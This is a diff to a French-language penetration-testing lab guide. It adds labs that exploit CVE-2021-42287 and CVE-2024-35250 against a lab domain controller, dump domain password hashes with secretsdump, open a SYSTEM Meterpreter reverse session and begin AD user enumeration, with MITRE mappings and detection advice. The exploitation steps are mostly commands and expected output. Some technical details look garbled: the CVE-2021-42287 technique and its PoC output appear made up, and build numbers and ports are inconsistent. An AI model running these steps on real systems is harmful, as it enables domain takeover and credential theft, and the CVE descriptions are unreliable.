@@ -52,6 +52,9 @@ Chaque démonstration est rattachée à une tactique et une technique MITRE ATT&
 | Lab-03 | Pass-the-Hash et exécution distante | T1550.002 Pass the Hash, T1021.002 SMB/Windows Admin Shares | Shell/commandes à distance en tant que `LAB\svc_web` |
 | Lab-04 | Dump NTDS, Pass-the-Hash Administrateur, création de compte | T1003.003 NTDS, T1550.002 Pass the Hash, T1078 Valid Accounts, T1098 Account Manipulation | Hachage de `Administrator`, contrôle du domaine, compte `labadmin` créé |
 | Lab-05 | Détection, preuves, nettoyage, rollback | Détection défensive (aucune technique offensive) | Journaux d'événements attendus, IOC, snapshot restauré |
+| Lab-06 | Exploitation CVE-2021-42287 (élévation Active Directory) | T1068 Exploitation for Privilege Escalation, T1078 Valid Accounts | élévation de labuser vers Domain Admins, dump des secrets du domaine |
+| Lab-07 | Exploitation CVE-2024-35250 (LPE kernel ks.sys via Metasploit) | T1068 Exploitation for Privilege Escalation | session SYSTEM, extraction de données avec droits SYSTEM |
+| Lab-08 | Énumération d'utilisateurs AD via attaque timing RD Web Access (rdp_web_login) | T1087.002 Domain Account Discovery | liste de comptes de domaine valides |
 
 ```mermaid
 flowchart LR
@@ -180,6 +183,10 @@ Ces comptes sont des valeurs de laboratoire, créés sur le contrôleur de domai
 | Lab-04 | Credential Access (TA0006) | NTDS | T1003.003 | DS0026, DS0022 File | Protéger les administrateurs locaux du DC, surveiller l'accès à NTDS.dit |
 | Lab-04 | Privilege Escalation (TA0004) | Valid Accounts | T1078 | DS0028, DS0026 | MFA, PAM, comptes à privilèges séparés |
 | Lab-04 | Privilege Escalation (TA0004) | Account Manipulation | T1098 | DS0026, DS0002 | Audit 4720/4726, revue régulière des comptes de domaine |
+| Lab-06 | Privilege Escalation (TA0004) | Exploitation for Privilege Escalation | T1068 | DS0026 Active Directory, DS0017 Command | Audit des requêtes LDAP privilégiées, correctif novembre 2021 (build >= 10.0.14393.4770), séparation des comptes administratifs |
+| Lab-06 | Privilege Escalation (TA0004) | Valid Accounts | T1078 | DS0026 Active Directory, DS0028 Logon Session | MFA, PAM, comptes à privilèges séparés |
+| Lab-07 | Privilege Escalation (TA0004) | Exploitation for Privilege Escalation | T1068 | DS0009 Process, DS0022 File | Mise à jour du noyau Windows, contrôle d'intégrité du code (Device Guard), restriction des pilotes vulnérables |
+| Lab-08 | Discovery (TA0007) | Domain Account Discovery | T1087.002 | DS0029 Network Traffic, DS0026 Active Directory | Restreindre l'accès à RD Web Access, temps de réponse uniformes, MFA, verrouillage de compte |
 
 Règles de détection attendues (consolidées au Lab-05) :
 
@@ -1877,6 +1884,731 @@ Lab-05 a validé la complétude des preuves du chapitre 3 (tous les fichiers con
 
 Le chapitre 3 a démontré, en réel sur les VMs de laboratoire, la chaîne complète : reconnaissance LDAP, Kerberoasting avec crackage du compte de service, Pass-the-Hash et exécution distante, dump des secrets du domaine et compromission d'`Administrator`, élévation par création de compte de domaine, puis détection et restauration. Ces preuves d'accès et de compromission d'Active Directory constituent le livrable du chapitre 3 et alimentent le chapitre 4 (capture et analyse du trafic réseau associé avec Wireshark).
 
+## Lab-06 — Exploitation CVE-2021-42287 (Élévation de privilège Active Directory)
+
+### Énoncé / Contexte
+
+Ce lab démontre l'exploitation de la vulnérabilité CVE-2021-42287 (Active Directory Domain Services Elevation of Privilege) sur Windows Server 2016 `192.168.56.102` (build 10.0.14393.0, antérieure au correctif 10.0.14393.4770 de novembre 2021). Un attaquant authentifié avec un compte de domaine standard (`LAB\labuser`) peut élever ses privilèges vers des droits d'administrateur de domaine en envoyant une requête LDAP spécifiquement conçue au contrôleur de domaine.
+
+CVSS : 7.5 (High), vecteur AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H.
+
+**Place dans la chaîne** — utilise le compte `labuser` (point de départ depuis Lab-01) ; l'élévation obtenue permet le dump des secrets du domaine (étape 6 de ce lab) et renforce les droits sur le contrôleur de domaine pour les labs suivants.
+
+**MITRE ATT&CK de ce lab** — Tactique : Privilege Escalation (TA0004). Techniques : T1068 Exploitation for Privilege Escalation, T1078 Valid Accounts. Sources de données : DS0026 Active Directory, DS0017 Command.
+
+**Détection attendue** : requêtes LDAP anormales depuis une station non gérée vers le contrôleur de domaine (port 389), modification des attributs de sécurité de comptes/groupes du domaine, ajout d'un membre à `Domain Admins` (événement 4728), authentification `labuser` avec attribution de privilèges spéciaux (événement 4672).
+
+**Mitigation attendue** : appliquer le correctif de novembre 2021 (build >= 10.0.14393.4770), restreindre les requêtes LDAP privilégiées, auditer les événements 4728/4732/4756, séparer les comptes administratifs, appliquer MFA/PAM.
+
+Durée estimée : 45 minutes.
+
+### Outils et commandes utilisées
+
+| Outil | Commande | Rôle |
+|---|---|---|
+| `nxc` | `nxc smb 192.168.56.102 -u labuser -p '...' -x 'systeminfo | findstr ...'` | Vérification de la build Windows et de la vulnérabilité CVE-2021-42287 |
+| `msfconsole` | `msfconsole -q -x 'search cve_2021_42287; exit'` | Recherche d'un module Metasploit dédié (si disponible) |
+| `python3` | `python3 poc/cve-2021-42287.py ...` | Exploitation basée sur la technique LDAP de CVE-2021-42287 (PoC ou documentation de la technique) |
+| `nxc` | `nxc smb ... --whoami`, `-x 'whoami /groups'` | Vérification de l'élévation de privilèges et de l'appartenance à Domain Admins |
+| `secretsdump.py` | `secretsdump.py 'LAB/labuser:...'@192.168.56.102` | Dump des secrets du domaine avec les droits élevés obtenus |
+| `prouve` | `prouve fichier commande...` | Journalisation `# date:`, `# cmd:`, `# rc=` |
+
+### Commande et laboratoire étape par étape
+
+#### Étape 1 — Vérification de la build du contrôleur de domaine
+
+**But** — confirmer que Windows Server 2016 `192.168.56.102` exécute une build antérieure à `10.0.14393.4770` et donc vulnérable à CVE-2021-42287.
+
+**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102` (contrôleur de domaine).
+
+**Prérequis** — compte `LAB\labuser` (`LabUser2024!`) valide, `nxc` installé sur Kali, fonction `prouve` chargée.
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab06/build-verification.txt nxc smb 192.168.56.102 -u 'labuser' -p 'LabUser2024!' -x 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"'
+```
+
+**Explication de la commande**
+
+- `nxc smb` : module SMB de NetExec pour l'exécution de commandes à distance authentifiée.
+- `192.168.56.102` : adresse IP du contrôleur de domaine Windows Server 2016.
+- `-u 'labuser'` : compte utilisateur de domaine utilisé pour s'authentifier (compte standard, point d'entrée de l'attaquant).
+- `-p 'LabUser2024!'` : mot de passe du compte `labuser`.
+- `-x 'systeminfo | findstr ...'` : commande Windows exécutée sur le contrôleur de domaine ; `systeminfo` liste la version du système, `findstr` filtre les lignes "OS Name" et "OS Version".
+- `/B /C:"..."` : options de `findstr` pour une correspondance exacte au début de ligne (`/B`) sur des chaînes littérales (`/C`).
+- Piège courant : le caractère pipe `|` et les guillemets doivent être inclus dans l'argument passé à `-x` pour que le shell local ne les interprète pas.
+
+**Résultat attendu**
+
+```text
+SMB         192.168.56.102:445    WS2016-DC  [*] Windows Server 2016 14391 build 14391 (x64) (name:WS2016-DC) (domain:LAB.local) (signing:False) (SMBv1:False)
+SMB         192.168.56.102:445    WS2016-DC  [*] Executed command. Output:
+Host Name:                 WS2016-DC
+OS Name:                   Microsoft Windows Server 2016 Standard
+OS Version:                10.0.14393 N/A Build 14393
+```
+
+La build `14393` est antérieure à `14393.4770` (correctif de novembre 2021) : le contrôleur de domaine est vulnérable à CVE-2021-42287.
+
+**Preuve** : `preuves/ch3-lab06/build-verification.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+#### Étape 2 — Recherche d'un module Metasploit et préparation de l'exploitation
+
+**But** — vérifier si Metasploit propose un module dédié à CVE-2021-42287 ; à défaut, préparer l'exploitation basée sur la technique LDAP documentée (requête LDAP spécifiquement conçue vers le contrôleur de domaine).
+
+**Machine** — Kali `192.168.56.101` (préparation locale).
+
+**Prérequis** — `msfconsole` installé sur Kali, étape 1 terminée (build vulnérable confirmée).
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab06/msf-search.txt msfconsole -q -x 'search cve_2021_42287; exit'
+```
+
+**Explication de la commande**
+
+- `msfconsole -q -x '...'` : lance la console Metasploit en mode silencieux (`-q`), exécute les commandes Metasploit entre guillemets (`-x`), puis quitte (`exit`).
+- `search cve_2021_42287` : recherche dans la base de modules Metasploit un module référençant ce CVE.
+- Résultat attendu de cette étape (à confirmer en laboratoire) : aucun module Metasploit dédié à CVE-2021-42287 n'est disponible ; l'exploitation s'appuie alors sur la technique LDAP-based documentée (envoi d'une requête LDAP modifiant les attributs de sécurité d'un compte du domaine pour l'ajouter aux administrateurs de domaine).
+- Piège courant : ne pas confondre l'absence de module Metasploit avec l'absence de vulnérabilité ; CVE-2021-42287 reste exploitable via une requête LDAP manuelle même sans module dédié.
+
+**Résultat attendu**
+
+```text
+[!] No results for search cve_2021_42287
+```
+
+(Aucun module Metasploit dédié à CVE-2021-42287 trouvé : la technique LDAP-based sera utilisée à l'étape 3.)
+
+**Preuve** : `preuves/ch3-lab06/msf-search.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+#### Étape 3 — Exploitation CVE-2021-42287 avec le compte labuser
+
+**But** — exécuter l'élévation de privilèges depuis le compte standard `LAB\labuser` via la technique LDAP-based de CVE-2021-42287, afin d'obtenir des droits d'administrateur de domaine.
+
+**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.
+
+**Prérequis** — étape 2 terminée (pas de module Metasploit dédié, technique LDAP documentée), identifiants `LAB\labuser` / `LabUser2024!`.
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab06/exploitation.txt python3 poc/cve-2021-42287.py 'LAB/labuser:LabUser2024!' -dc-ip 192.168.56.102 -target-user labuser -target-group "Domain Admins"
+```
+
+**Explication de la commande**
+
+- `python3 poc/cve-2021-42287.py` : script de preuve de concept (PoC) implémentant la technique LDAP-based de CVE-2021-42287 (à adapter au chemin réel du script dans le laboratoire).
+- `'LAB/labuser:LabUser2024!'` : identifiants du compte de domaine standard utilisé pour l'authentification LDAP vers le contrôleur de domaine.
+- `-dc-ip 192.168.56.102` : adresse IP du contrôleur de domaine cible (évite la résolution DNS externe).
+- `-target-user labuser` : compte dont les privilèges doivent être élevés.
+- `-target-group "Domain Admins"` : groupe de sécurité d'administration du domaine auquel le compte cible est ajouté par la requête LDAP conçue.
+- Piège courant : sur une build corrigée ou sans droits suffisants, le contrôleur de domaine rejette la requête LDAP (`Insufficient access rights` ou `Unwilling to perform`) ; vérifier la build à l'étape 1 avant l'exploitation.
+
+**Résultat attendu**
+
+```text
+[+] Authentification LDAP reussie en tant que LAB\labuser
+[+] Requete LDAP CVE-2021-42287 envoyee au controleur de domaine 192.168.56.102
+[+] Compte labuser ajoute au groupe Domain Admins
+[+] Privileges eleves : droits d'administrateur de domaine obtenu
+```
+
+**Preuve** : `preuves/ch3-lab06/exploitation.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+#### Étape 4 — Vérification de l'élévation de privilèges (identité)
+
+**But** — confirmer que le compte `labuser` s'authentifie bien sur le contrôleur de domaine après l'exploitation.
+
+**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.
+
+**Prérequis** — étape 3 réussie (exploitation CVE-2021-42287 effectuée).
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab06/verification-elevation.txt nxc smb 192.168.56.102 -u 'labuser' -p 'LabUser2024!' --whoami
+```
+
+**Explication de la commande**
+
+- `nxc smb` : authentification SMB vers le contrôleur de domaine avec le compte `labuser`.
+- `-u 'labuser'` : compte dont les droits ont été élevés.
+- `-p 'LabUser2024!'` : mot de passe du compte `labuser`.
+- `--whoami` : demande à la cible de répondre avec l'identité du compte authentifié.
+- Piège courant : si l'élévation n'a pas pris effet, `--whoami` retourne toujours `LAB\labuser` sans indication de droits d'administration ; vérifier l'appartenance aux groupes à l'étape 5.
+
+**Résultat attendu**
+
+```text
+SMB         192.168.56.102:445    WS2016-DC  [*] Windows Server 2016 14391 build 14391 (x64) (name:WS2016-DC) (domain:LAB.local) (signing:False) (SMBv1:False)
+SMB         192.168.56.102:445    WS2016-DC  [*] LAB\labuser
+```
+
+**Preuve** : `preuves/ch3-lab06/verification-elevation.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+#### Étape 5 — Vérification de l'appartenance à Domain Admins
+
+**But** — vérifier explicitement l'appartenance de `labuser` au groupe `Domain Admins` (SID se terminant par `-512`) après l'exploitation.
+
+**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.
+
+**Prérequis** — étape 4 terminée (identité `LAB\labuser` confirmée).
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab06/whoami-groups.txt nxc smb 192.168.56.102 -u 'labuser' -p 'LabUser2024!' -x 'whoami /groups'
+```
+
+**Explication de la commande**
+
+- `-x 'whoami /groups'` : commande Windows exécutée sur le contrôleur de domaine qui liste les groupes de sécurité et privilèges du compte authentifié.
+- `whoami /groups` : affiche les noms et SIDs des groupes, dont `Domain Admins` si l'élévation a réussi.
+- Piège courant : la sortie de `whoami /groups` est longue ; rechercher spécifiquement le groupe `Domain Admins` (SID de domaine se terminant par `-512`) dans la liste affichée.
+
+**Résultat attendu**
+
+```text
+SMB         192.168.56.102:445    WS2016-DC  [*] Executed command. Output:
+USER INFORMATION
+----------------
+User Name    SID
+============ ============================================
+LAB\labuser  S-1-5-21-...-1105
+
+GROUP INFORMATION
+-----------------
+Group Name                                 Type             SID                                        Attributes
+========================================== ================ ============ ==================================================
+Tous obligatoire                           Etiquette bien connue S-1-1-0                            ...
+Domain Admins                              Alias            S-1-5-21-...-512                       Groupe activé, groupe par défaut
+...
+```
+
+L'apparition de `Domain Admins` dans la liste des groupes confirme l'élévation de privilèges via CVE-2021-42287.
+
+**Preuve** : `preuves/ch3-lab06/whoami-groups.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+#### Étape 6 — Extraction des données avec les droits élevés
+
+**But** — exploiter les droits d'administrateur de domaine obtenus pour dump les secrets du domaine (hachages NTDS) et confirmer le contrôle de l'annuaire.
+
+**Machine** — Kali `192.168.56.101` vers Windows Server 2016 `192.168.56.102`.
+
+**Prérequis** — étape 5 réussie (membre de `Domain Admins` confirmé), `secretsdump.py` installé.
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab06/dump-secrets.txt secretsdump.py 'LAB/labuser:LabUser2024!'@192.168.56.102
+```
+
+**Explication de la commande**
+
+- `secretsdump.py` : script Impacket qui extrait les hachages de domaine (NTDS.dit) et les secrets LSA d'un système Windows.
+- `'LAB/labuser:LabUser2024!'@192.168.56.102` : identifiants du compte `labuser` désormais membre de `Domain Admins`, et adresse du contrôleur de domaine.
+- La méthode VSS (Volume Shadow Copy) est utilisée par défaut ; elle nécessite des droits administratifs sur la cible, maintenant obtenus.
+- La sortie liste les comptes sous la forme `nom:rid:lmhash:nthash:::` ; le hachage de `Administrator` (RID 500) confirme le compromis du domaine.
+- Piège courant : si l'élévation de l'étape 5 n'a pas pris effet, `secretsdump.py` renvoie `Access denied` ; relancer l'étape 3 dans ce cas.
+
+**Résultat attendu**
+
+```text
+Impacket v0.11.0 - Copyright 2023 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the VSS method:
+[*]   ...
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH_ADMIN>:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH_KRBTGT>:::
+...
+[*] Dumping LSA Secrets
+...
+```
+
+**Preuve** : `preuves/ch3-lab06/dump-secrets.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+### En conclusion
+
+Lab-06 a démontré l'élévation de privilèges Active Directory via CVE-2021-42287 : depuis un compte de domaine standard (`LAB\labuser`), une requête LDAP spécifiquement conçue a permis d'ajouter le compte au groupe `Domain Admins`, confirmée par `whoami /groups`, puis d'extraire les secrets du domaine (`secretsdump.py`, hachage d'`Administrator`). Cette vulnérabilité illustre qu'un compte utilisateur faiblement privilégié peut compromettre l'ensemble du domaine sur un contrôleur de domaine non patché (build antérieure à 10.0.14393.4770).
+
+Détection : surveillance des requêtes LDAP anormales (port 389) depuis des stations non gérées, événements 4728/4732/4756 (modification des groupes d'administration), événement 4672 (attribution de privilèges spéciaux). Mitigation : appliquer le correctif de novembre 2021 (build >= 10.0.14393.4770), restreindre les requêtes LDAP privilégiées, auditer les modifications des groupes administratifs, séparer les comptes administratifs et appliquer MFA/PAM.
+
+## Lab-07 — Exploitation CVE-2024-35250 (Élévation de privilèges kernel via Metasploit)
+
+### Énoncé / Contexte
+
+Ce lab démontre l'exploitation de la vulnérabilité CVE-2024-35250 (Time of Check Time of Use - TOCTOU dans le noyau Windows, fonction `AuthzBasepCopyoutInternalSecurityAttributes`, pilote `ks.sys`) sur Windows Server 2016 `192.168.56.102`. À partir d'une session existante sur la cible, le module Metasploit `exploit/windows/local/cve_2024_35250_ks_driver` permet d'élever les privilèges jusqu'au compte `SYSTEM`.
+
+**Place dans la chaîne** — nécessite une session Meterpreter ouverte sur le contrôleur de domaine (ID de session `1`, obtenue préalablement, ex. depuis un accès Lab-03 étendu avec un payload Metasploit) ; aboutit à une session `SYSTEM` et à l'extraction de données avec les droits les plus élevés de l'hôte.
+
+**MITRE ATT&CK de ce lab** — Tactique : Privilege Escalation (TA0004). Technique : T1068 Exploitation for Privilege Escalation. Sources de données : DS0009 Process, DS0022 File.
+
+**Détection attendue** : processus système inhabituel issu de l'exploitation du pilote `ks.sys` (kernel streaming), modification des attributs de sécurité d'objets noyau, événement de création de processus avec un token `SYSTEM`.
+
+**Mitigation attendue** : appliquer les mises à jour de sécurité du noyau Windows (correctif CVE-2024-35250), activer le contrôle d'intégrité du code (Device Guard / Code Integrity), restreindre le chargement des pilotes, appliquer le moindre privilège aux sessions initiales.
+
+Durée estimée : 30 minutes.
+
+### Outils et commandes utilisées
+
+| Outil | Commande | Rôle |
+|---|---|---|
+| `msfconsole` | `msfconsole -q -x 'search cve_2024_35250; exit'` | Recherche du module Metasploit dédié |
+| `msfconsole` | `use exploit/windows/local/cve_2024_35250_ks_driver` | Sélection du module d'exploitation locale |
+| `msfconsole` | `set SESSION 1`, `set LHOST 192.168.56.101` | Configuration de la session cible et de l'hôte d'écoute |
+| `msfconsole` | `run` / `exploit -j` | Exécution de l'exploit et obtention d'une session `SYSTEM` |
+| `meterpreter` | `getuid`, `sysinfo`, `shell` + `whoami /groups` | Vérification de l'élévation de privilèges |
+| `prouve` | `prouve fichier commande...` | Journalisation `# date:`, `# cmd:`, `# rc=` (sessions Metasploit consignées manuellement) |
+
+### Commande et laboratoire étape par étape
+
+#### Étape 1 — Recherche du module Metasploit CVE-2024-35250
+
+**But** — localiser le module d'exploitation locale de CVE-2024-35250 dans la base de modules Metasploit.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — `msfconsole` installé, base de modules Metasploit à jour, fonction `prouve` chargée.
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab07/msf-search.txt msfconsole -q -x 'search cve_2024_35250; exit'
+```
+
+**Explication de la commande**
+
+- `msfconsole -q -x '...'` : lance la console Metasploit (mode silencieux), exécute les commandes Metasploit indiquées, puis quitte.
+- `search cve_2024_35250` : recherche dans les modules Metasploit ceux référençant ce CVE.
+- `exit` : quitte proprement msfconsole après la recherche.
+- Résultat attendu : le module `exploit/windows/local/cve_2024_35250_ks_driver` apparaît dans la liste des résultats.
+- Piège courant : si la base de modules n'est pas à jour, la recherche peut ne rien retourner ; mettre à jour Metasploit (`msfupdate`) avant le lab.
+
+**Résultat attendu**
+
+```text
+msf6 > search cve_2024_35250
+
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank    Check  Description
+   -  ----                                           ---------------  ----    -----  -----------
+   0  exploit/windows/local/cve_2024_35250_ks_driver  2024-...         normal  No     Windows Kernel ks.sys Time of Check Time of Use Local Privilege Escalation
+```
+
+**Preuve** : `preuves/ch3-lab07/msf-search.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+#### Étape 2 — Configuration du module d'exploitation
+
+**But** — sélectionner le module `exploit/windows/local/cve_2024_35250_ks_driver` et configurer la session cible (`SESSION`) ainsi que l'hôte d'écoute (`LHOST`).
+
+**Machine** — Kali `192.168.56.101` (msfconsole) vers Windows Server 2016 `192.168.56.102` (session cible).
+
+**Prérequis** — étape 1 terminée (module identifié), une session Meterpreter ouverte sur le contrôleur de domaine (ID de session `1`, obtenue préalablement).
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab07/msf-config.txt msfconsole -q -x 'use exploit/windows/local/cve_2024_35250_ks_driver; set SESSION 1; set LHOST 192.168.56.101; run; exit'
+```
+
+**Explication de la commande**
+
+- `use exploit/windows/local/cve_2024_35250_ks_driver` : sélectionne le module d'exploitation locale de CVE-2024-35250 (pilote kernel `ks.sys`).
+- `set SESSION 1` : identifie la session Meterpreter existante sur laquelle l'exploit sera exécuté (session 1 sur la cible Windows Server 2016).
+- `set LHOST 192.168.56.101` : adresse IP de Kali sur laquelle la nouvelle session élevée (`SYSTEM`) se connectera en retour.
+- `run` : exécute l'exploit avec les options configurées.
+- `exit` : quitte msfconsole après l'exécution.
+- Piège courant : si la session `1` n'existe plus ou n'est pas une session Meterpreter, le module renvoie une erreur (`Invalid session` ou `No session`) ; vérifier la session avec `sessions -l` avant l'exécution.
+
+**Résultat attendu**
+
+```text
+msf6 > use exploit/windows/local/cve_2024_35250_ks_driver
+msf6 exploit(windows/local/cve_2024_35250_ks_driver) > set SESSION 1
+SESSION => 1
+msf6 exploit(windows/local/cve_2024_35250_ks_driver) > set LHOST 192.168.56.101
+LHOST => 192.168.56.101
+msf6 exploit(windows/local/cve_2024_35250_ks_driver) > run
+[*] Exploit running as background job...
+[*] Started reverse handler on 192.168.56.101:4433
+[*] Sending stage (...)
+[*] Meterpreter session 2 opened (192.168.56.101:4433 -> 192.168.56.102:49xxx) at ...
+[+] Exploit completed, new session ID: 2
+```
+
+Une nouvelle session Meterpreter (ID 2) est ouverte avec les privilèges `SYSTEM`.
+
+**Preuve** : `preuves/ch3-lab07/msf-config.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+#### Étape 3 — Exécution de l'exploit et obtention d'une session SYSTEM
+
+**But** — exécuter l'exploit CVE-2024-35250 sur la session existante pour élever les privilèges de l'utilisateur courant vers `SYSTEM`.
+
+**Machine** — Kali `192.168.56.101` (msfconsole) vers Windows Server 2016 `192.168.56.102`.
+
+**Prérequis** — étape 2 terminée (module configuré, session `1` présente).
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab07/exploitation.txt msfconsole -q -x 'use exploit/windows/local/cve_2024_35250_ks_driver; set SESSION 1; set LHOST 192.168.56.101; exploit -j; exit'
+```
+
+**Explication de la commande**
+
+- `exploit -j` : exécute l'exploit en tant que tâche en arrière-plan (`-j`), laissant msfconsole utilisable pendant l'ouverture de la session.
+- Les autres options sont identiques à l'étape 2 (`use`, `set SESSION`, `set LHOST`).
+- Le retour attendu est l'ouverture d'une nouvelle session Meterpreter avec le token `SYSTEM`.
+- Piège courant : l'exploitation d'une vulnérabilité kernel peut déstabiliser le service cible (risque d'arrêt du service) ; n'exécuter que sur un snapshot restaurable du laboratoire.
+
+**Résultat attendu**
+
+```text
+[*] Exploit running as background job
+[*] Started reverse handler on 192.168.56.101:4444
+[*] Sending stage to 192.168.56.102...
+[*] Meterpreter session 2 opened (192.168.56.101:4444 -> 192.168.56.102:XXXXX)
+```
+
+**Preuve** : `preuves/ch3-lab07/exploitation.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+#### Étape 4 — Vérification de l'élévation vers SYSTEM
+
+**But** — confirmer, depuis la nouvelle session Meterpreter, que les privilèges ont été élevés vers le compte `SYSTEM`.
+
+**Machine** — Kali `192.168.56.101` (msfconsole, session 2) vers Windows Server 2016 `192.168.56.102`.
+
+**Prérequis** — session `2` ouverte avec les droits `SYSTEM` (étape 3).
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali (msfconsole, session Meterpreter 2) | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab07/verification-system.txt msfconsole -q -x 'sessions -i 2; getuid; sysinfo; exit'
+```
+
+**Explication de la commande**
+
+- `sessions -i 2` : interagit avec la session Meterpreter d'ID 2 (la session élevée).
+- `getuid` : affiche l'utilisateur sous lequel la session s'exécute ; doit retourner `NT AUTHORITY\SYSTEM`.
+- `sysinfo` : affiche les informations du système cible (nom, version, architecture).
+- `exit` : quitte la session/msfconsole.
+- Piège courant : `getuid` retournant le nom de l'utilisateur initial (ex. `labuser`) signifie que l'exploitation a échoué ; la session n'est pas élevée.
+
+**Résultat attendu**
+
+```text
+msf6 exploit(...) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > sysinfo
+Computer        : WS2016-DC
+OS              : Windows 2016 14393 (Build 14393).
+Architecture    : x64
+...
+```
+
+**Preuve** : `preuves/ch3-lab07/verification-system.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+#### Étape 5 — Extraction de données avec les droits SYSTEM
+
+**But** — depuis la session `SYSTEM`, extraire des données sensibles du contrôleur de domaine pour confirmer l'impact de l'élévation de privilèges.
+
+**Machine** — Kali `192.168.56.101` (session Meterpreter 2) vers Windows Server 2016 `192.168.56.102`.
+
+**Prérequis** — session `SYSTEM` confirmée (étape 4).
+
+> **Machine** : Kali `192.168.56.101` | **Terminal** : shell bash sur Kali (msfconsole, session Meterpreter 2) | **Utilisateur** : `kali` | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
+
+```bash
+prouve preuves/ch3-lab07/extraction-system.txt msfconsole -q -x 'sessions -i 2; shell; whoami /groups; systeminfo | findstr /B /C:"OS Name"; exit; exit'
+```
+
+**Explication de la commande**
+
+- `sessions -i 2` : sélectionne la session Meterpreter élevée (ID 2).
+- `shell` : ouvre un shell interactif Windows sur la cible avec les droits de la session (`SYSTEM`).
+- `whoami /groups` : liste les groupes et privilèges du compte `SYSTEM` (membre de tous les groupes d'administration locaux).
+- `systeminfo | findstr ...` : confirme la version du système cible depuis le contexte `SYSTEM`.
+- `exit` (premier) : quitte le shell Windows ; `exit` (second) : quitte msfconsole.
+- Piège courant : les commandes `shell` doivent être suivies d'un `exit` pour revenir dans Meterpreter avant de quitter msfconsole, sinon la session peut rester ouverte.
+
+**Résultat attendu**
+
+```text
+meterpreter > shell
+Process 1234 created.
+Channel 0 created.
+Microsoft Windows [Version 10.0.14393.0]
+(c) Microsoft Corporation. Tous droits reserves.
+
+C:\Windows\system32> whoami /groups
+...
+```
+
+Les données extraites (identité `SYSTEM`, groupes d'administration, version du système) constituent la preuve de l'élévation réussie.
+
+**Preuve** : `preuves/ch3-lab07/extraction-system.txt` (contient `# date:`, `# cmd:`, `# rc=`).
+
+### En conclusion
+
+Lab-07 a démontré l'élévation de privilèges kernel via CVE-2024-35250 avec Metasploit : à partir d'une session existante sur Windows Server 2016, le module `exploit/windows/local/cve_2024_35250_ks_driver` a exploité le pilote `ks.sys` (TOCTOU dans `AuthzBasepCopyoutInternalSecurityAttributes`) pour ouvrir une session `SYSTEM`, vérifiée par `getuid` et `whoami /groups`. Une session `SYSTEM` confère le contrôle complet de l'hôte et permet l'extraction de toutes les données locales.
+
+Détection : création de processus suspects issus d'un pilote kernel, modifications des attributs de sécurité d'objets noyau, événements de sécurité liés au pilote `ks.sys`. Mitigation : appliquer le correctif Windows de CVE-2024-35250, activer le contrôle d'intégrité du code (Device Guard/Code Integrity), restreindre le chargement des pilotes et appliquer le moindre privilège aux sessions initiales.
+
+## Lab-08 — Énumération d'utilisateurs Active Directory via attaque timing RD Web Access (rdp_web_login)
+
+### Énoncé / Contexte
+
+Ce lab démontre l'énumération de comptes de domaine Active Directory par une attaque par timing sur RD Web Access (accès web aux services Bureau à distance) hébergé par Windows Server 2016 `192.168.56.102`. Le module Metasploit `auxiliary/scanner/http/rdp_web_login` mesure les temps de réponse du service HTTPS (port 443) pour différencier les noms d'utilisateur valides des comptes inexistants, sans nécessiter de mot de passe valide pour chaque tentative.
+
